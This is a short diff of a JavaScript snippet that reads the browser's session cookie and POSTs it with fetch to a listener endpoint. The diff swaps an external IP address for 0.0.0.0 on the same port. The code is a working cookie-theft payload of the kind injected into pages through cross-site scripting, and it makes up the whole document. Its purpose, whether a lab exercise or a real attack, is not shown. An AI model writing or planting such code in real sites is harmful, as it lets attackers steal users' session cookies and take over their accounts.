@@ -1,6 +1,6 @@
 var sessionid = document.cookie.split('=')[1]+".";
 
-fetch('http://39.101.137.200:7745/send', {
+fetch('http://0.0.0.0:7745/send', {
   method: 'POST',
   body: 'header=fdsafdsa&listener=admin123321&content='+sessionid,
   headers: {
